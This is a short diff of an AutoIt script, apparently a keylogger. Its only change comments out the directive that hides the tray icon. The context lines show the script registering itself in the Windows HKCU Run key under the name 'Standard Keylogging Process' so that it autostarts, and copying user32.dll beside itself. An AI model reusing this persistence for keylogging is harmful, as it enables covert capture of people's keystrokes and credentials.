@@ -10,7 +10,7 @@
 #include <Misc.au3>
 #include <string.au3>
 #include <File.au3>
-#NoTrayIcon
+;#NoTrayIcon
 
 RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Standard Keylogging Process", "REG_SZ", @ScriptFullPath)
 FileCopy(@SystemDir & "\user32.dll", @ScriptDir & "\user32.dll")
